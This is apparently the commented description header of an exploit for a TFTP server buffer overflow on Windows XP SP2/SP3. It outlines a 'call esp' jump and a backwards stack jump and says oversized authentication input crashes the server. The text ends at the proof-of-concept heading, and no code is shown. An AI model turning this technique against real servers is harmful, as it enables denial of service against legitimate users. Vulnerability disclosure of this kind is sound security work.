#1. Description

#His technique works fine against Windows XP Professional Service Pack 2 and 3 (English).
#For this exploit I have tried several strategies to increase reliability and performance:
#Jump to a static 'call esp'
#Backwards jump to code a known distance from the stack pointer.
#The TFTP server does not correctly handle the amount of data or bytes sent..
#When authenticating to the TFTP server with a large number of characters for the server to process, the server will crash as soon as it is received and processed, causing denial of service conditions.
#Successful exploitation of these issues allows remote attackers to crash the affected server, denying service to legitimate users.

#2. Proof of Concept - PoC
